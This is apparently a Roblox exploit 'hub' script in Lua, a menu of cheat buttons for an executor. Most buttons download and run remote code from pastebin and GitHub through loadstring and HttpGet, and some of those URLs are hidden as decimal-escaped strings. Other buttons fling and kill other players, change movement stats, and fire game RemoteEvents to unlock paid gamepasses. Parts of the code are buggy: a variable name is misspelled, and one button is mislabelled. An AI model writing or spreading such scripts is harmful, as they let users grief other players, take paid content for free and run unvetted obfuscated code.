local kavoUi = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
local window = kavoUi.CreateLib("command | haxker gui","DarkTheme")  ---Tabs

local Tab1 = window:NewTab("Main")
local Tab1Section = Tab1:NewSection("Main")   --Buttons

Tab1Section:NewButton("Fe bypass","Executed fe bypass Script",function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()
end)  Tab1Section:NewButton("my script","Execute Game Script",function()
local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()

local Window = Library.CreateLib("fe hub made by command UPDATED", "Ocean")

local PlrTab = Window:NewTab("Home")
local PlrSection = PlrTab:NewSection("Welcome, " .. game.Players.LocalPlayer.DisplayName)
local PlrSection = PlrTab:NewSection("Update game hub arceusX key is arceusX and SypanseX and GigaChad-Hub")

local PlrTab = Window:NewTab("Players Hacks")
local PlrSection = PlrTab:NewSection("Hacks")

PlrSection:NewButton("Reset", "Reser ur character", function()
    game.Players.LocalPlayer.Character.Head:Destroy()
end)

PlrSection:NewToggle("Disable Gravity", "ToggleInfo", function(state)
    if state then
        worksapce.Gravity = 0
    else
        worksapce.Gravity = 196.2
    end
end)

PlrSection:NewSlider("Speed", "SliderInfo", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)

PlrSection:NewSlider("Jump Power", "SliderInfo", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
end)

local OthersTab = Window:NewTab("Others")
local OthersSection = OthersTab:NewSection("Others")

OthersSection:NewButton("Fe Brookhaven kill all", "ButtonInfo", function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\65\99\117\114\97\88\48\52\57\47\111\98\102\117\115\99\97\116\101\100\83\99\114\105\112\116\115\47\109\97\105\110\47\75\105\108\108\71\117\105\34\41\41\40\41\10")()
end)

OthersSection:NewButton("fling people script", "ButtonInfo", function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/dark-modz/0ef7e0cc9f92a64c874a3c5a75c88ade/raw/0b9e8b37d1b9d2e2676707f76297ba9f530cb0bd/rocketfling",true))()
end)

OthersSection:NewButton("fly v3", "ButtonInfo", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/YSL3xKYU'))()
end)

OthersSection:NewButton("Infinite yield", "ButtonInfo", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Infinite%20Yield.txt"))()
end)

OthersSection:NewButton("Free gamepass", "ButtonInfo", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Infinite%20Yield.txt"))()
end)

OthersSection:NewButton("FE BLOCK SPAWNER SCRIPT", "ButtonInfo", function()
    local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local part = Instance.new("Part")
part.BrickColor = BrickColor.new("Bright blue")
part.Size = Vector3.new(5, 5, 5)

while true do
    local position = character.PrimaryPart.Position
    local randomOffset = Vector3.new(math.random(-10, 10), math.random(-10, 10), math.random(-10, 10))
    part:Clone().Parent = workspace
    part.Position = position + randomOffset
    wait(0.1) -- Adjust the delay between spawns as desired
end
end)

OthersSection:NewButton("FE RAINBOW MAP", "ButtonInfo", function()
    --Made by SUPERSONIC GAMERZ 
while true do
    for _, part in ipairs(workspace:GetDescendants()) do
        if part:IsA("BasePart") then
            local r = math.random()
            local g = math.random()
            local b = math.random()
            part.BrickColor = BrickColor.new(Color3.new(r, g, b))
        end
    end
    wait(0.5)
end
end)

OthersSection:NewButton("Ice hub", "ButtonInfo", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))() 
end)

OthersSection:NewButton("game hub", "ButtonInfo", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Game-Hub/main/loader"))()
end)
OthersSection:NewButton("GigaChad-Hub", "ButtonInfo", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/OWJBWKQLAISH/GigaChad-Hub/main/Protected_3038811338432694.lua.txt"))()
end)

OthersSection:NewButton("arceusX", "ButtonInfo", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/TYXS1p2C'))()
end)



OthersSection:NewButton("Sypanse X", "ButtonInfo", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/Chillz-s-scripts/main/Synapse-X-Remake.lua"))()
end)
OthersSection:NewButton("fe gamepass obby only", "ButtonInfo", function()
    for _,v in pairs(game:GetDescendants()) do if v.ClassName == "RemoteEvent" then if v.Parent.Name == "WeaponsRemotes" or v.Parent.Name == "VipRemotes" or v.Parent.Name == "Remotes" then v:FireServer() end end end
end)



local PlrTab = Window:NewTab("credits")
local PlrSection = PlrTab:NewSection("command team")
end)
